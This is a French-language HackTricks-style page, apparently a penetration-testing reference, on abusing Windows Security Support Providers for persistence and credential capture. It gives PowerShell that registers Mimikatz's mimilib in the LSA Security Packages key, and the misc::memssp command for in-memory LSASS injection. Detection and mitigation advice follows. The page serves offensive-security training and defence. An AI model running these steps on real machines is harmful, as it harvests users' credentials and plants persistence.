# Fournisseurs de support de sécurité personnalisés

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) sont des packages de sécurité basés sur des DLL, chargés par la Local Security Authority (LSA). Windows enregistre les DLL SSP/AP personnalisées via la valeur `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` et charge les packages enregistrés au démarrage du système.<sup>[[1]](#references)</sup>

Comme les SSP s'exécutent dans la LSA et peuvent recevoir des identifiants, les adversaires peuvent abuser d'un package malveillant pour accéder aux identifiants et assurer la persistence. MITRE suit ce comportement sous la référence T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz inclut `mimilib.dll`, qui implémente un SSP enregistrant les identifiants traités après son chargement. Dans un lab autorisé, placez la DLL correspondant à l'architecture cible dans `C:\Windows\System32`, puis inspectez la liste actuelle des packages avant de la modifier.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Une valeur existante typique peut contenir des packages tels que `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` et `pku2u`. Préservez chaque entrée existante lors de l’ajout du package personnalisé.<sup>[[1]](#references)</sup>

Ajoutez `mimilib` sans remplacer les packages existants :
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Après un redémarrage, le package est chargé dans LSA et les identifiants capturés par la suite sont écrits dans `C:\Windows\System32\kiwissp.log` par cette implémentation.<sup>[[2]](#references)[[3]](#references)</sup>

## Chargement en mémoire

Mimikatz peut également injecter son implémentation SSP dans le processus LSASS actuel :<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Cette méthode ne persiste pas après un redémarrage.<sup>[[2]](#references)[[3]](#references)</sup>

## Détection et mitigation

Surveillez les modifications apportées à `...\Lsa\Security Packages` ainsi que les chargements inattendus de DLL dans `lsass.exe`. L’événement de sécurité 4657 enregistre uniquement la modification d’une **valeur** de registre lorsque la stratégie Audit Registry et la SACL correspondantes sont configurées.<sup>[[2]](#references)[[4]](#references)</sup>

Lorsque cela est compatible, activez la protection LSA supplémentaire et recherchez les DLL SSP non signées ou inattendues. Microsoft documente la protection LSA spécifiquement comme un contrôle contre l’injection de code susceptible de compromettre les identifiants.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Enregistrement des DLL SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Dépôt Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Événement de sécurité 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Configurer la protection LSA supplémentaire](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
